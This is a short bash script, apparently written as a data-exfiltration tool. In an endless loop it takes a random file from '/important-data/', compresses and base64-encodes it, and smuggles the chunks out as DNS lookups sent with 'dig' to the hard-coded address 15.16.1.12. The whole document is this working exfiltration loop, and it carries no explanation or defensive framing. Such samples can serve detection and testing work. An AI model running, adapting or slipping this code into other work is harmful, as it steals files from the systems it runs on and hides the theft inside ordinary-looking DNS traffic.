#!/bin/bash

FOLDER="/important-data/"

while [[ true ]]; do
  # Select a random file from the specified folder
  FILE=$(find "$FOLDER" -type f | shuf -n 1)
  #execute shell script
  f=$FILE; s=4;b=40;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g";echo -e "\n=end=");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done ); do dig @15.16.1.12 `echo -ne $r$f|tr "+" "*"` +short; done
  sleep 20
done